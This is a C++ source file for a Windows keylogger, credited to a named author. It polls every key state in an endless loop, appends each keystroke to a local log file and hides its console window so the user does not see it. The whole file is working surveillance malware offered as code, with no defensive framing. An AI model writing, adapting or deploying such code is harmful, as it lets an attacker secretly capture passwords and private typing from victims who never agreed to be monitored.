/**
 * @author Juan Carlos Ramirez
 *
 * Windows based keylogger.
 * Should:
 *  Log keys with any focus.
 */

 #include <iostream>
 #include <windows.h>
 #include <winuser.h>
 
 using namespace std;

int saveToLog(int key_stroke, char *file);
void Stealth();

 int main(){
	 
	Stealth();
    char currentKey;

    while (true) {
        for (currentKey = 8; currentKey <= 190; currentKey++) {
            if (GetAsyncKeyState(currentKey) == -32767) {
                saveToLog(currentKey,"myLog.txt");
            }
        }
    }

    system("PAUSE");
    return 0;
 }


 int saveToLog(int key_stroke, char *file) {
     if ((key_stroke == 1) || (key_stroke == 2)) {
         return 0;
     }

    FILE *OUTPUT_FILE;
    fopen_s(&OUTPUT_FILE,file,"a");

    cout << key_stroke << endl;

    if(key_stroke == 8)  // The numbers stands for the ascii value of a character
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
     else if (key_stroke == 13)
         fprintf(OUTPUT_FILE, "%s", "n");
     else if (key_stroke == 32)
         fprintf(OUTPUT_FILE, "%s", " ");
     else if (key_stroke == VK_TAB)
         fprintf(OUTPUT_FILE, "%s", "[TAB]");
     else if (key_stroke == VK_SHIFT)
         fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
     else if (key_stroke == VK_CONTROL)
         fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
     else if (key_stroke == VK_ESCAPE)
         fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
     else if (key_stroke == VK_END)
         fprintf(OUTPUT_FILE, "%s", "[END]");
     else if (key_stroke == VK_HOME)
         fprintf(OUTPUT_FILE, "%s", "[HOME]");
     else if (key_stroke == VK_LEFT)
         fprintf(OUTPUT_FILE, "%s", "[LEFT]");
     else if (key_stroke == VK_UP)
         fprintf(OUTPUT_FILE, "%s", "[UP]");
     else if (key_stroke == VK_RIGHT)
         fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
     else if (key_stroke == VK_DOWN)
         fprintf(OUTPUT_FILE, "%s", "[DOWN]");
     else if (key_stroke == 190 || key_stroke == 110)
         fprintf(OUTPUT_FILE, "%s", ".");
     else
         fprintf(OUTPUT_FILE, "%s", &key_stroke);

     fclose(OUTPUT_FILE);
     return 0;
 }

 void Stealth() {
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}